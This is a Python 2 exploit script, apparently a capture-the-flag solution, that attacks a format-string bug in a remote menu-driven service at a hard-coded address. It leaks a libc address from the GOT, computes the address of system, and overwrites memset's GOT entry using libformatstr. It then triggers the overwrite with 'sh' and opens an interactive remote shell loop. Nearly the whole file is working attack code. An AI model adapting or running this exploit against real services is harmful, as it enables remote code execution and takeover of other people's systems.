#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''
Exploit the formatstring vulnerability with override the address of memset
Created on 2014/12/9
@author: Ben Chang
'''

from libformatstr import FormatStr
import socket
import struct
import time
#connect the server
host='218.2.197.235'
port=10102

#the offset address
offset_system=0x0003f430
offset_libc_main=0x000193e0
got_libc_main=0x8049128
got_memset=0x8049130  
#the payload
payload1=''        #leakage the address of libc_main_start
payload2=''        #overide the address of memset with the address of system 

#pack the payload 1
code1_data1=got_libc_main   #to leakage the address of libc_main
code1_data2='%7$s\n'     #the buf is the 7th arg of printf
payload1+=struct.pack('I',code1_data1)
payload1+=code1_data2

#connect to the server
sok=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sok.connect((host,port))

def Send(s):
    time.sleep(0.1)
    return sok.send(s)
def Receive(s):
    time.sleep(0.1)
    rdata=sok.recv(1024)
    if len(rdata)!=0:
        i=rdata.find(s)
        while i==-1:
            rdata=sok.recv(1024)
            i=rdata.find(s)
        return rdata 
print Receive('input your choice:')
Send('2\n')
print Receive('input your message')
Send(payload1)
print Receive('input your choice:') 
Send('3\n')
print Receive('Your message is:')   
rdata=sok.recv(8)    #leakage the address of libc_main
print rdata        
addr_libc_main=struct.unpack('I',rdata[-4:])[0]
print 'the address of  libc_main:',hex(addr_libc_main)
baseaddr_libc=addr_libc_main-offset_libc_main
print 'base address of libc:',hex(baseaddr_libc)
systemaddr=baseaddr_libc+offset_system
print 'address of system:',hex(systemaddr)
#use the libformatstr to exploit
p=FormatStr()
p[got_memset]=systemaddr     #override the address of memset with the address of system 
payload2=p.payload(7,start_len=0)+'\n'

#test for formatstr
fp=open('test','w')
fp.write(payload2)
fp.close()

#overide the addre of memset with address of system
print Receive('input your choice:')
Send('2\n')
print Receive('input your message')
Send(payload2)
print 'insert the payload2'
print Receive('input your choice:')
Send('3\n')             #exploit the formatstr vulner
print Receive('input your choice:')
Send('2\n')
print Receive('input your message')
Send('sh\n')   
print Receive('input your choice:')
Send('2\n')
print Receive('input your message')
Send('sh\n')
#get the shell
while True:
    cmd=raw_input("$")
    Send(cmd+'\n')
    print sok.recv(1024)
 
